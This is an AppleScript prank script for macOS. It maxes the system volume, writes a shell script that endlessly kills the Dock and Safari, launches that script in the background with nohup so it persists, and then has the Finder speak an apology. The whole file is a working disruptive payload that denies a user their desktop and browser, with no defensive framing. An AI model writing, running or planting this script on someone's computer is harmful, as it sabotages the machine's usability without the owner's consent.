tell application "Terminal"
	activate
	
	tell application "System Events" to keystroke "t" using command down
	repeat while contents of selected tab of window 1 starts with linefeed
		delay 0.01
	end repeat
	
	do script "osascript -e 'set Volume 10'" in window 1
	
	
	do script "echo 'while (true); do killAll Dock; killAll Safari; done' > blocker.sh" in window 1
	
	
	do script "nohup sh blocker.sh >/dev/null &" in window 1
	
	
	
end tell
tell application "Finder" to say "I am so sorry"
